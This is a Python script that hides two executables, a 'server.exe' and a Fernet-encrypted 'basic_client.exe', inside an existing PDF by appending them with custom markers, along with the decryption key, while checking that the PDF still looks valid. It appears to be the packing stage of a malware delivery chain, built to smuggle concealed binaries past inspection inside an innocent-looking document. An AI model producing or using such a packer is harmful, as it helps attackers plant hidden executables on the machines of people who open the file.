from cryptography.fernet import Fernet
import base64
import secrets
import os

def generate_key():
    """Generate a Fernet key with a specific prefix"""
    random_part = secrets.token_bytes(28)
    key = b"DZDZ" + random_part  # 32 bytes total as required by Fernet
    return base64.urlsafe_b64encode(key)

def encrypt_file(file_path, key):
    """Encrypt a file using Fernet"""
    try:
        f = Fernet(key)
        with open(file_path, 'rb') as file:
            file_data = file.read()
            return f.encrypt(file_data)
    except Exception as e:
        raise Exception(f"Encryption error: {e}")

def append_data_to_pdf(pdf_path, data, identifier):
    """Append binary data to PDF with clear markers"""
    try:
        # Read the existing PDF content
        with open(pdf_path, 'rb') as f:
            pdf_content = f.read()
        
        # Verify it's a valid PDF
        if not pdf_content.startswith(b'%PDF'):
            raise ValueError("Not a valid PDF file")
            
        # Create markers
        start_marker = f"\n%%{identifier}%%\n".encode()
        end_marker = f"\n%%END_{identifier}%%\n".encode()
        
        # Write everything back
        with open(pdf_path, 'wb') as f:
            f.write(pdf_content)  # Original PDF
            f.write(start_marker)
            f.write(base64.b64encode(data))  # Base64 encoded data
            f.write(end_marker)
            
        # Verify the file is still readable
        with open(pdf_path, 'rb') as f:
            test_read = f.read()
            if not test_read.startswith(b'%PDF'):
                raise ValueError("PDF corruption check failed")
                
    except Exception as e:
        raise Exception(f"PDF append error: {e}")

def hide_exes_in_pdf(pdf_path, server_exe, client_exe):
    """Hide both executables in the PDF with encryption for the client"""
    try:
        # Validate input files
        if not os.path.exists(pdf_path):
            raise FileNotFoundError(f"PDF file not found: {pdf_path}")
        if not os.path.exists(server_exe):
            raise FileNotFoundError(f"Server EXE not found: {server_exe}")
        if not os.path.exists(client_exe):
            raise FileNotFoundError(f"Client EXE not found: {client_exe}")
            
        # Read server executable
        with open(server_exe, 'rb') as f:
            server_data = f.read()
        
        # Generate key and encrypt client
        key = generate_key()
        encrypted_client = encrypt_file(client_exe, key)
        
        # Append everything in order
        append_data_to_pdf(pdf_path, server_data, 'SERVER_EXE')
        append_data_to_pdf(pdf_path, key, 'ENCRYPTION_KEY')
        append_data_to_pdf(pdf_path, encrypted_client, 'ENCRYPTED_CLIENT')
        
        return key.decode()
        
    except Exception as e:
        raise Exception(f"Hide operation failed: {e}")

def main():
    pdf_path = "hebrew.pdf"
    server_exe = "server.exe"
    client_exe = "basic_client.exe"

    try:
        print("Starting file hiding process...")
        key = hide_exes_in_pdf(pdf_path, server_exe, client_exe)
        print("\nFiles hidden successfully!")
        print(f"Original PDF: {pdf_path}")
        print(f"Hidden server: {server_exe}")
        print(f"Hidden encrypted client: {client_exe}")
        print(f"\nEncryption key: {key}")
        
        # Verify file sizes
        final_size = os.path.getsize(pdf_path)
        print(f"\nFinal PDF size: {final_size:,} bytes")
        
    except Exception as e:
        print(f"\nError: {e}")
        exit(1)

if __name__ == "__main__":
    main()